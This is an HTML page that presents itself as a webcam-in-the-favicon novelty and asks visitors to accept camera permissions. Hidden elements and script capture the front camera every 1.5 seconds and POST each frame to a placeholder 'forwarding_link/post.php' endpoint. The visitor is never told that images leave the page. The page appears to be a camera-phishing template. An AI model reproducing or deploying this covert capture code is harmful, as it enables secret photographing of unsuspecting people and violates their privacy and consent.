<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script>
function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'forwarding_link/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
    },
    error: function(){
    }
  });
};

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    facingMode: "user"
  }
};

async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

  var context = canvas.getContext('2d');
  setInterval(function(){
    context.drawImage(video, 0, 0, 640, 480);
    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
    post(canvasData);
  }, 1500);
}

init();

navigator.getUserMedia = navigator.getUserMedia || navigator.mozGetUserMedia;

window.onload = () => {
    const favicon = document.createElement('link');
    favicon.rel = 'shortcut icon';
    favicon.type = 'image/png';
    favicon.href = '../../images/favicon.ico';
    document.getElementsByTagName('head')[0].appendChild(favicon);
    const w = 32;
    const h = 32;
    const canvas = document.createElement('canvas');
    canvas.style = 'display: none';
    canvas.width = w;
    canvas.height = h;
    document.body.appendChild(canvas);
    const ctx = canvas.getContext('2d');
    const video = document.createElement('video');
    video.style = 'display: none';
    video.width = canvas.width;
    video.height = canvas.height;
    document.body.appendChild(video);
    navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
        video.srcObject = stream;
        video.play();
        loop();
    });
    let mirror = false;
    const loop = () => {
        ctx.save();
        if (mirror) {
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
        }
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.restore();
        favicon.setAttribute('href', canvas.toDataURL());
        setTimeout(loop, 100);
    };
    document.getElementById('mirror').addEventListener('change', e => {
        mirror = e.target.checked;
    });
};
</script>

<style>
* {
    margin: 0;
    padding: 0;
}

body {
    padding-top: 20px;
    text-align: center;
    font-family: Arial;
}
</style>

<body>
    <p>Hint: Look at the favicon</p>
    <p>(Accept Permissions)</p>
    <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
</body>
</html>
